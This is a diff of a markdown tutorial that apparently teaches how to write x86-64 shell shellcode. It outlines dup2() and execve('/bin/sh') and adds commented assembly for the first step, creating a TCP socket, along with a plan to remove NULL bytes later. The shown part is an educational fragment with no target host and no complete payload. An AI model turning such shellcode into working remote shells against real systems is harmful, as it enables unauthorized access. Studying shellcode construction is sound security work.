@@ -35,11 +35,6 @@ To duplicate the standard input, output and error, `dup2()` call will be used:
 ```c
 int dup2(int oldfd, int newfd); 
 ```
-From the manpage:
-
-```markdown
-The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor,  it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.  
-```
 
 And to execute `/bin/sh`, will use the `execve()` call: 
 
@@ -49,8 +44,27 @@ int execve(const char *filename, char *const argv[], char *const envp[]);
 ### ASM Implementation
 ----
 
+Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. No enphasys has been put into removing NULLs and make the shellcode small (this is done later).
 
+1. **CREATE A SOCKET**
 
+```asm
+; sock = socket(AF_INET, SOCK_STREAM, 0) 
+mov rax, 41                     ; syscall number 
+mov rdi, AF_INET                ; IPv4 
+mov rsi, SOCK_STREAM            ; TCP connection 
+mov rdx, 0                      ; IP Protocol 
+syscall 
+; Save the socket_id value in RDI for future use 
+mov rdi, rax                    ; value returned in RAX by syscall  
+```
+This is the first step required for sockets, open the socket. 
+To execute the sys_socket system call the arguments will have to be placed in the corresponding registers: 
+
+ - RAX <- 41 : Syscall number. 
+ - RDI <- 2 : Domain parameter. AF_INET is for IPv4. 
+ - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
+ - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
 
 
 
